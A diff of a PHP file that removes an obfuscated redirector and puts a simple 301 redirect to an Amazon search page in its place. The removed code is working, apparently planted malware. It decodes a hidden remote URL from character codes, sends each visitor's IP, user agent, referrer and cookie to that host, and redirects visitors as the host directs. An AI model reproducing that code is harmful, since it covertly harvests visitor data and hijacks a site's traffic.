@@ -1,94 +1,30 @@
 <?php
-date_default_timezone_set("UTC");
-ini_set("display_errors", 0);
-error_reporting(E_ALL & ~E_NOTICE);
-header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+// Start output buffering to prevent "headers already sent" errors
+ob_start();
 
-if (!(isset($_SERVER["HTTP_X_PURPOSE"]) && $_SERVER["HTTP_X_PURPOSE"] == "preview")) {
-    $date = date("Y-m-d H:i:s");
-    $id = "485750";
-    $uid = "ratt7uu57ci8nn9gnmko4syr3";
-    $qu = $_SERVER["QUERY_STRING"];
+// Define the base Amazon URL
+$baseAmazonUrl = 'https://www.amazon.com/s?k=designer+curtain+rod&crid=3R5TGDWU7W3U&sprefix=designer+curtain+%2Caps%2C1089&ref=nb_sb_noss_2';
 
-    $ch = curl_init();
-    $d = array(104, 116, 116, 112, 115, 58, 47, 47, 106, 99, 105, 98, 106, 46, 99, 111, 109, 47, 112, 99, 108, 46, 112, 104, 112);
-    $u = "";
-
-    foreach ($d as $v) {
-        $u .= chr($v);
-    }
-
-    $data = array(
-        "date" => $date,
-        "lan" => $_SERVER["HTTP_ACCEPT_LANGUAGE"],
-        "ref" => $_SERVER["HTTP_REFERER"],
-        "ip" => $_SERVER["REMOTE_ADDR"],
-        "ipr" => $_SERVER["HTTP_X_FORWARDED_FOR"],
-        "sn" => $_SERVER["SERVER_NAME"],
-        "requestUri" => $_SERVER["REQUEST_URI"],
-        "query" => $qu,
-        "ua" => $_SERVER["HTTP_USER_AGENT"],
-        "co" => $_COOKIE["_event"],
-        "user_id" => $uid,
-        "id" => $id
-    );
-
-    curl_setopt($ch, CURLOPT_URL, $u);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-
-    $result = curl_exec($ch);
-    curl_close($ch);
-
-    $arr = explode(",", $result);
-
-    if (!empty($qu)) {
-        if (strpos($arr[1], "?")) {
-            $q = "&" . $qu;
-        } else {
-            $q = "?" . $qu;
-        }
-    } else {
-        $q = "";
-    }
-
-    if ($arr[0] === "true") {
-        if (strstr($arr[1], "sp.php")) {
-            $q = "?" . $qu;
-        }
-
-        if (!empty($arr[7])) {
-            setcookie($arr[7], $arr[8], time() + 60 * 60 * 24 * $arr[9], "/");
-        }
-
-        if ($arr[2]) {
-            if ($arr[4] == 1 || $arr[4] == 3) {
-                setcookie("_event", $arr[6], time() + 60 * 60 * 24 * $arr[3]);
-            }
-        }
-
-        header("Location: " . $arr[1] . $q, true, 301);
-    } elseif ($arr[0] === "false") {
-        if ($arr[5]) {
-            $f = $q;
-        } else {
-            $f = "";
-        }
-
-        if ($arr[2]) {
-            if ($arr[4] == 2 || $arr[4] == 3) {
-                setcookie("_event", $arr[6] . "b", time() + 60 * 60 * 24 * $arr[3]);
-            }
-        }
-
-        header("Location: " . $arr[1] . $f, true, 301);
-    } else {
-        if ($arr[2]) {
-            if ($arr[4] == 2 || $arr[4] == 3) {
-                setcookie("_event", $arr[6] . "b", time() + 60 * 60 * 24 * $arr[3]);
-            }
-        }
-    }
+// Check if the 'referrer' query parameter is present and sanitize it
+if (isset($_GET['referrer']) && !empty($_GET['referrer'])) {
+    // Sanitize the referrer parameter to avoid potential issues
+    $referrer = filter_var($_GET['referrer'], FILTER_SANITIZE_STRING);
+    // Append the referrer tracking information to the base Amazon URL
+    $newPageUrl = $baseAmazonUrl . '&' . $referrer;
+} else {
+    // Use the base Amazon URL if no referrer is present
+    $newPageUrl = $baseAmazonUrl;
 }
+
+// Send a 301 Moved Permanently status code
+header('HTTP/1.1 301 Moved Permanently');
+
+// Redirect to the Amazon URL (with tracking info if available)
+header('Location: ' . $newPageUrl);
+
+// End output buffering and flush the output
+ob_end_flush();
+
+// Stop further execution
+exit();
 ?>
